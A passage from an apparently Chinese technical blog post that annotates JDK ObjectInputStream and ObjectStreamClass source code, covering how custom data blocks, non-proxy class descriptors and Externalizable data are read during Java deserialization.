class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跳过“自定义数据区”（custom data）：持续消费所有 Block-Data 块以及其间</span></span><br><span class="line"><span class="comment"> * 可能穿插的对象，直到遇到结构化标记 TC_ENDBLOCKDATA 为止。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型使用场景：</span></span><br><span class="line"><span class="comment"> * - 类/代理类“注解块”（classAnnotations）：在 writeNonProxyDesc /</span></span><br><span class="line"><span class="comment"> *   writeProxyDesc 中，子类可在 Block-Data 模式下通过 annotateClass /</span></span><br><span class="line"><span class="comment"> *   annotateProxyClass 写入任意原始字节，甚至调用 writeObject 写入对象；</span></span><br><span class="line"><span class="comment"> *   读取端需把这些内容全部吞掉，直至 ENDBLOCKDATA。</span></span><br><span class="line"><span class="comment"> * - Serializable 层级中声明了 writeObject(...) 的“自定义数据区”：</span></span><br><span class="line"><span class="comment"> *   readObject 调用结束后，若该层 hasWriteObjectData 为真，这里要把剩余</span></span><br><span class="line"><span class="comment"> *   的块/对象全部跳过，直到 ENDBLOCKDATA。</span></span><br><span class="line"><span class="comment"> * - Externalizable 且使用块数据（SC_BLOCK_DATA）时，readExternal 返回后，</span></span><br><span class="line"><span class="comment"> *   同样需要跳过残余块直至 ENDBLOCKDATA。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义要点：</span></span><br><span class="line"><span class="comment"> * - Block-Data 模式下可能夹杂 TC_BLOCKDATA / TC_BLOCKDATALONG 多个块，</span></span><br><span class="line"><span class="comment"> *   也可能夹杂对象（writeObject 会临时切至“非块模式”输出 TC_* 标记）。</span></span><br><span class="line"><span class="comment"> * - 本方法既会“批量跳过块”，也会在必要时递归读取对象（readObject0(false)），</span></span><br><span class="line"><span class="comment"> *   直到真正看到 TC_ENDBLOCKDATA 才返回。</span></span><br><span class="line"><span class="comment"> * - 返回前恢复 passHandle（保持外层上下文的当前句柄不被污染）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">skipCustomData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldHandle</span> <span class="operator">=</span> passHandle; <span class="comment">// 保护外层当前句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.getBlockDataMode()) &#123;</span><br><span class="line">            <span class="comment">// 若仍在块模式：一次性跳过当前 block 的剩余字节，然后切回非块模式</span></span><br><span class="line">            bin.skipBlockData();</span><br><span class="line">            bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此时处于“非块模式”，窥视下一个类型码决定后续动作</span></span><br><span class="line">        <span class="keyword">switch</span> (bin.peekByte()) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="comment">// 下一个是新的 block 开头：切回块模式，循环顶端会把它跳过</span></span><br><span class="line">                bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="comment">// 注解/自定义数据区的结束标记：消费并收尾返回</span></span><br><span class="line">                bin.readByte();</span><br><span class="line">                passHandle = oldHandle; <span class="comment">// 恢复外层句柄</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 既不是 block 也不是 ENDBLOCKDATA：那就是穿插的对象/数组/字符串等</span></span><br><span class="line">                <span class="comment">// 递归读取并丢弃其值（共享语义 false），直到最终遇到 ENDBLOCKDATA</span></span><br><span class="line">                readObject0(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着，会调用 <code>ObjectStreamClass</code> 中的 <code>initNonProxy</code> 方法，在这个方法里会初始化表示非代理类的类描述符。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化“非代理类（non-proxy）”的类描述符（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语境说明（反序列化侧）：</span></span><br><span class="line"><span class="comment"> * - model     ：来自“流中 classDesc”的模板（按对端写出的结构解析得到），可理解为“流端模型”。</span></span><br><span class="line"><span class="comment"> * - cl        ：本地 JVM 中解析到的实际 Class（若本地类缺失或解析失败，则为 null）。</span></span><br><span class="line"><span class="comment"> * - resolveEx ：解析 cl 过程中捕获到的 CNFE（若有）。</span></span><br><span class="line"><span class="comment"> * - superDesc ：已初始化好的“父类”的 ObjectStreamClass（可为 null，表示到达 Object 顶层）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 目标：</span></span><br><span class="line"><span class="comment"> * - 将“流端模型”与“本地类（若存在）”进行一致性校验（代理/枚举/可序列化语义/SUID/类名等）。</span></span><br><span class="line"><span class="comment"> * - 将关键元信息（flags/fields/方法钩子/构造器等）绑定到本实例，用于随后对象体的反序列化。</span></span><br><span class="line"><span class="comment"> * - 构建字段反射器（FieldReflector）以确定“默认字段”读取时的字节布局与对象字段顺序映射。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">initNonProxy</span><span class="params">(ObjectStreamClass model,</span></span><br><span class="line"><span class="params">                  Class&lt;?&gt; cl,</span></span><br><span class="line"><span class="params">                  ClassNotFoundException resolveEx,</span></span><br><span class="line"><span class="params">                  ObjectStreamClass superDesc)</span></span><br><span class="line">    <span class="keyword">throws</span> InvalidClassException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从流端模型取出 SUID；这里通过 Long.valueOf 再拆箱为 long（等价于 model.getSerialVersionUID()）</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">suid</span> <span class="operator">=</span> Long.valueOf(model.getSerialVersionUID());</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">osc</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 本地类对应的 OSC（若 cl != null 则尝试获取，用于对比与复用）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// lookup(cl, true)：构建/查找与本地 Class 绑定的 OSC（“本地描述符”）</span></span><br><span class="line">        osc = lookup(cl, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 绝不允许“非代理描述符”去绑定“代理类”</span></span><br><span class="line">        <span class="keyword">if</span> (osc.isProxy) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                <span class="string">&quot;cannot bind non-proxy descriptor to a proxy class&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 枚举身份必须一致：流端是 enum，本地也必须是 enum；反之亦然</span></span><br><span class="line">        <span class="keyword">if</span> (model.isEnum != osc.isEnum) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                model.isEnum</span><br><span class="line">                    ? <span class="string">&quot;cannot bind enum descriptor to a non-enum class&quot;</span></span><br><span class="line">                    : <span class="string">&quot;cannot bind non-enum descriptor to an enum class&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) SUID 一致性：</span></span><br><span class="line">        <span class="comment">//    - 仅当“双方都走 Serializable 语义”（非 Externalizable，且非数组）时严格校验 SUID。</span></span><br><span class="line">        <span class="comment">//    - 若不一致：抛出 InvalidClassException（典型的“本地类不兼容”错误）。</span></span><br><span class="line">        <span class="keyword">if</span> (model.serializable == osc.serializable &amp;&amp;</span><br><span class="line">            !cl.isArray() &amp;&amp;</span><br><span class="line">            suid != osc.getSerialVersionUID())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                osc.name,</span><br><span class="line">                <span class="string">&quot;local class incompatible: &quot;</span> +</span><br><span class="line">                <span class="string">&quot;stream classdesc serialVersionUID = &quot;</span> + suid +</span><br><span class="line">                <span class="string">&quot;, local class serialVersionUID = &quot;</span> + osc.getSerialVersionUID());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 类名一致性（使用 classNamesEqual 以容忍内部/外部命名差异的比较逻辑）</span></span><br><span class="line">        <span class="keyword">if</span> (!classNamesEqual(model.name, osc.name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                osc.name,</span><br><span class="line">                <span class="string">&quot;local class name incompatible with stream class &quot;</span> +</span><br><span class="line">                <span class="string">&quot;name \&quot;&quot;</span> + model.name + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 可序列化语义一致性（仅在非 enum 情况下才有意义）</span></span><br><span class="line">        <span class="keyword">if</span> (!model.isEnum) &#123;</span><br><span class="line">            <span class="comment">// 5.a Serializable vs Externalizable 互斥：两端若都“可序列化”，则对 Externalizable 标志必须一致</span></span><br><span class="line">            <span class="keyword">if</span> ((model.serializable == osc.serializable) &amp;&amp;</span><br><span class="line">                (model.externalizable != osc.externalizable))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    osc.name,</span><br><span class="line">                    <span class="string">&quot;Serializable incompatible with Externalizable&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5.b 若在“是否 Serializable/Externalizable”上不一致，或两者都不是</span></span><br><span class="line">            <span class="comment">//     （既非 Serializable 也非 Externalizable），则标记本类“不可反序列化”。</span></span><br><span class="line">            <span class="keyword">if</span> ((model.serializable != osc.serializable) ||</span><br><span class="line">                (model.externalizable != osc.externalizable) ||</span><br><span class="line">                !(model.serializable || model.externalizable))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 注意：这里不是立刻抛出，而是记录到 deserializeEx；</span></span><br><span class="line">                <span class="comment">// 随后在真正读对象数据前会通过 checkDeserialize() 抛出。</span></span><br><span class="line">                deserializeEx = <span class="keyword">new</span> <span class="title class_">ExceptionInfo</span>(</span><br><span class="line">                    osc.name, <span class="string">&quot;class invalid for deserialization&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 绑定“基础元信息”到当前 desc（以流端模型为准；cl/resolveEx/superDesc 直接挂载）——</span></span><br><span class="line">    <span class="built_in">this</span>.cl = cl;                          <span class="comment">// 本地 Class，可为 null（类缺失）</span></span><br><span class="line">    <span class="built_in">this</span>.resolveEx = resolveEx;            <span class="comment">// 解析失败时记录异常以延后报告</span></span><br><span class="line">    <span class="built_in">this</span>.superDesc = superDesc;            <span class="comment">// 父类的 OSC</span></span><br><span class="line">    name = model.name;                     <span class="comment">// 按流端模型的类名</span></span><br><span class="line">    <span class="built_in">this</span>.suid = suid;                      <span class="comment">// 使用流端 SUID（上面已做一致性校验）</span></span><br><span class="line">    isProxy = <span class="literal">false</span>;                       <span class="comment">// 本方法处理的是“非代理类”</span></span><br><span class="line">    isEnum = model.isEnum;                 <span class="comment">// 枚举身份按模型同步（前面已确保一致）</span></span><br><span class="line">    serializable = model.serializable;     <span class="comment">// 是否 Serializable</span></span><br><span class="line">    externalizable = model.externalizable; <span class="comment">// 是否 Externalizable</span></span><br><span class="line">    hasBlockExternalData = model.hasBlockExternalData; <span class="comment">// v2 协议下的 Externalizable 是否块封装</span></span><br><span class="line">    hasWriteObjectData = model.hasWriteObjectData;     <span class="comment">// 是否存在自定义 writeObject 数据段（SC_WRITE_METHOD）</span></span><br><span class="line">    fields = model.fields;                 <span class="comment">// 字段描述（先用模型的，稍后由反射器“匹配重写”）</span></span><br><span class="line">    primDataSize = model.primDataSize;     <span class="comment">// 该层 primitive 字段总字节数（模型计算值）</span></span><br><span class="line">    numObjFields = model.numObjFields;     <span class="comment">// 该层对象字段数量（模型计算值）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 若本地 OSC 存在，则尽量复用“本地信息”（方法钩子/保护域/构造器等）——</span></span><br><span class="line">    <span class="keyword">if</span> (osc != <span class="literal">null</span>) &#123;</span><br><span class="line">        localDesc = osc;                            <span class="comment">// 记录本地描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化/反序列化钩子方法（若存在）：writeObject/readObject/readObjectNoData</span></span><br><span class="line">        writeObjectMethod    = localDesc.writeObjectMethod;</span><br><span class="line">        readObjectMethod     = localDesc.readObjectMethod;</span><br><span class="line">        readObjectNoDataMethod = localDesc.readObjectNoDataMethod;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 替换/解析钩子：writeReplace/readResolve</span></span><br><span class="line">        writeReplaceMethod   = localDesc.writeReplaceMethod;</span><br><span class="line">        readResolveMethod    = localDesc.readResolveMethod;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若前面未提前记录“不可反序列化”的原因，则沿用本地的错误信息（若有）</span></span><br><span class="line">        <span class="keyword">if</span> (deserializeEx == <span class="literal">null</span>) &#123;</span><br><span class="line">            deserializeEx = localDesc.deserializeEx;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保护域与可用构造器（无参可访问构造器/特权构造器句柄等，本地准备好的）</span></span><br><span class="line">        domains = localDesc.domains;</span><br><span class="line">        cons    = localDesc.cons;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 为“默认字段”读写建立反射器：确定 primitive 段布局、对象字段顺序与映射关系 —— </span></span><br><span class="line">    fieldRefl = getReflector(fields, localDesc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重要：用反射器“匹配/重写”后的字段数组替换原 fields，</span></span><br><span class="line">    <span class="comment">// 以反映“本地类上的 unshared 设置 / 类型签名差异 / 实际可见性与顺序”等本地侧特性。</span></span><br><span class="line">    fields = fieldRefl.getFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记初始化完成（后续 checkDeserialize()/默认字段读写等才允许使用）</span></span><br><span class="line">    initialized = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>初始化完毕后会调用 <code>handles</code> 的 <code>finish</code> 方法完成引用 <code>Handle</code> 的赋值操作：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7) 完成该描述符的构建，允许后续通过句柄回引</span></span><br><span class="line">handles.finish(descHandle);</span><br><span class="line">passHandle = descHandle;</span><br><span class="line"><span class="keyword">return</span> desc;</span><br></pre></td></tr></table></figure></div>

<h3 id="readExternalData"><a href="#readExternalData" class="headerlink" title="readExternalData"></a>readExternalData</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取 Externalizable 对象的数据区：</span></span><br><span class="line"><span class="comment"> * - 若 &#123;<span class="doctag">@code</span> obj != null&#125;，通过调用其 &#123;<span class="doctag">@code</span> readExternal(this)&#125; 让对象自行读取；</span></span><br><span class="line"><span class="comment"> * - 若 &#123;<span class="doctag">@code</span> obj == null&#125;（本地无法解析该类），则尽力跳过该对象的外部化数据。</span></span><br><span class="line"><span class="comment"> * - 约定：调用本方法前，&#123;<span class="doctag">@code</span> passHandle&#125; 已指向该对象的句柄。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 协议要点：</span></span><br><span class="line"><span class="comment"> * - 若类描述符带有 SC_BLOCK_DATA（即 &#123;<span class="doctag">@code</span> desc.hasBlockExternalData() == true&#125;），</span></span><br><span class="line"><span class="comment"> *   则写端是在“块数据模式”下写的外部化数据（writeExternal），并以 TC_ENDBLOCKDATA 结束；</span></span><br><span class="line"><span class="comment"> *   读端需切换到块模式，调用 readExternal 后使用 &#123;<span class="doctag">@code</span> skipCustomData()&#125; 吃掉</span></span><br><span class="line"><span class="comment"> *   剩余块，直到读到 TC_ENDBLOCKDATA，确保与写端对齐。</span></span><br><span class="line"><span class="comment"> * - 若不带 SC_BLOCK_DATA（旧协议 v1 样式），外部化数据不是块包裹；如果本地类不存在</span></span><br><span class="line"><span class="comment"> *   或 readExternal 抛 CNF（类缺失），可能无法把所有字节正确消费，流可能失去对齐——</span></span><br><span class="line"><span class="comment"> *   JDK 的做法是“保持历史兼容，先不处理；后续读时如仍有残留会抛 StreamCorruptedException”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 回调/上下文：</span></span><br><span class="line"><span class="comment"> * - Externalizable 路径不允许 defaultReadObject/readFields 等“默认反序列化 API”，</span></span><br><span class="line"><span class="comment"> *   因此这里会暂时清空 &#123;<span class="doctag">@code</span> curContext&#125;，防止误用；在进入/退出时对旧上下文做完整性检查。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readExternalData</span><span class="params">(Externalizable obj, ObjectStreamClass desc)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 保存并校验外层回调上下文；Externalizable 路径禁止使用“默认反序列化”相关 API</span></span><br><span class="line">    <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">    <span class="keyword">if</span> (oldContext != <span class="literal">null</span>) &#123;</span><br><span class="line">        oldContext.check(); <span class="comment">// 确保外层上下文处于合法可切换状态</span></span><br><span class="line">    &#125;</span><br><span class="line">    curContext = <span class="literal">null</span>;      <span class="comment">// 清空：禁止在 readExternal 内调用 defaultReadObject/readFields</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 是否使用“块数据模式”读取外部化数据（由类描述符 SC_BLOCK_DATA 标志决定）</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">blocked</span> <span class="operator">=</span> desc.hasBlockExternalData();</span><br><span class="line">        <span class="keyword">if</span> (blocked) &#123;</span><br><span class="line">            <span class="comment">// 与写端 writeExternalData(...) 对应：进入块模式以读取 TC_BLOCKDATA* 中的内容</span></span><br><span class="line">            bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 让对象自己读取并恢复状态；内部可调用 readInt/readObject 等</span></span><br><span class="line">                obj.readExternal(<span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 多数情况下，句柄表在更早阶段已把 CNF 传播到了 passHandle；</span></span><br><span class="line"><span class="comment">                 * 但若 readExternal 中新构造并抛出了一个 CNF，这里补记到句柄表上，</span></span><br><span class="line"><span class="comment">                 * 以便上层在合适时机感知并抛出。</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                handles.markException(passHandle, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blocked) &#123;</span><br><span class="line">            <span class="comment">// 若采用块模式写入外部化数据：readExternal 可能未完全读尽数据块，</span></span><br><span class="line">            <span class="comment">// 此处负责吞掉剩余的 block-data，直到遇到 TC_ENDBLOCKDATA，并切回非块模式。</span></span><br><span class="line">            skipCustomData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 恢复并再次校验外层回调上下文，保证未被非法复用</span></span><br><span class="line">        <span class="keyword">if</span> (oldContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            oldContext.check();</span><br><span class="line">        &#125;</span><br><span class="line">        curContext = oldContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 说明（历史兼容）：</span></span><br><span class="line"><span class="comment">     * 若外部化数据不是以块形式写入（blocked == false），并且：</span></span><br><span class="line"><span class="comment">     *   - 本地不存在该类（obj == null），或</span></span><br><span class="line"><span class="comment">     *   - readExternal() 抛出了 ClassNotFoundException，</span></span><br><span class="line"><span class="comment">     * 则本次调用可能没有把该对象的全部外部化字节读尽，导致流位置可能与写端不同步。</span></span><br><span class="line"><span class="comment">     * 这里遵循旧实现的策略：不额外干预，假定流仍然同步；若实际还有残留外部化数据，</span></span><br><span class="line"><span class="comment">     * 后续读取时（读到意外的类型码/字节）很可能抛出 StreamCorruptedException。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取给定对象在“每一层可序列化类（从父类→子类）”上的实例数据。</span></span><br><span class="line"><span class="comment"> * - 若 obj 为 null（本地无法解析该类）或当前句柄已记录 CNF 等异常，则仅“跳过”该层字段数据。</span></span><br><span class="line"><span class="comment"> * - 约定：调用前 passHandle 